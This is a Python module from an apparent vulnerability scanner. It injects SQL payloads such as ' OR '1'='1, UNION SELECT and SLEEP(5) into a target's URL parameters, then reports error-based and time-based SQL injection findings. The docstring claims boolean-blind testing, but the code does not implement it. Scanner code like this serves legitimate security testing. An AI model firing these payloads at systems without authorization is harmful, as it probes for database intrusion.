"""SQL Injection Testing Module — error-based, boolean-blind, time-blind."""

from __future__ import annotations
import time
from typing import Any
import httpx, structlog
from src.core.module_runner import VulnModule

logger = structlog.get_logger(__name__)

class SQLiModule(VulnModule):
    name = "sqli_scanner"
    category = "sqli"
    description = "SQL Injection detection (error, boolean-blind, time-blind)"

    ERROR_PAYLOADS = ["'", '"', "' OR '1'='1", "1' AND '1'='2", "' UNION SELECT NULL--",
                      "1; SELECT 1--", "') OR ('1'='1"]
    TIME_PAYLOADS = ["1' AND SLEEP(5)--", "1'; WAITFOR DELAY '0:0:5'--",
                     "1' AND (SELECT 1 FROM (SELECT SLEEP(5))a)--"]
    SQL_ERRORS = ["sql syntax", "mysql", "postgresql", "sqlite", "oracle", "mssql",
                  "unclosed quotation", "syntax error", "query failed", "ORA-", "PG::"]

    async def test(self, target: str, params: dict, auth: Any = None,
                   hypothesis: dict | None = None) -> list[dict[str, Any]]:
        findings = []
        client = httpx.AsyncClient(timeout=20.0, verify=False, follow_redirects=True)
        try:
            # Get baseline
            base_resp = await client.get(target, params=params or {})
            base_body = base_resp.text.lower()
            base_time = 0.0

            # Error-based detection
            for payload in self.ERROR_PAYLOADS:
                for param in (params or {"id": "1"}):
                    test_params = dict(params or {})
                    test_params[param] = payload
                    try:
                        resp = await client.get(target, params=test_params)
                        body = resp.text.lower()
                        for error in self.SQL_ERRORS:
                            if error in body and error not in base_body:
                                findings.append({
                                    "title": f"SQL Injection (Error-based) via '{param}'",
                                    "description": f"SQL error '{error}' triggered at {target}",
                                    "severity": "critical",
                                    "category": "sqli",
                                    "affected_url": target, "param": param,
                                    "confidence": 0.9,
                                    "evidence": {"payload": payload, "error_pattern": error},
                                    "source_tool": self.name,
                                })
                                return findings  # Critical finding, stop
                    except Exception:
                        pass

            # Time-based blind detection
            for payload in self.TIME_PAYLOADS:
                for param in (params or {"id": "1"}):
                    test_params = dict(params or {})
                    test_params[param] = payload
                    try:
                        start = time.monotonic()
                        resp = await client.get(target, params=test_params)
                        elapsed = time.monotonic() - start
                        if elapsed > 4.5:
                            findings.append({
                                "title": f"SQL Injection (Time-based blind) via '{param}'",
                                "description": f"Response delayed by {elapsed:.1f}s with time payload",
                                "severity": "critical",
                                "category": "sqli",
                                "affected_url": target, "param": param,
                                "confidence": 0.75,
                                "evidence": {"payload": payload, "delay_seconds": round(elapsed, 2)},
                                "source_tool": self.name,
                            })
                            return findings
                    except Exception:
                        pass
        finally:
            await client.aclose()
        return findings
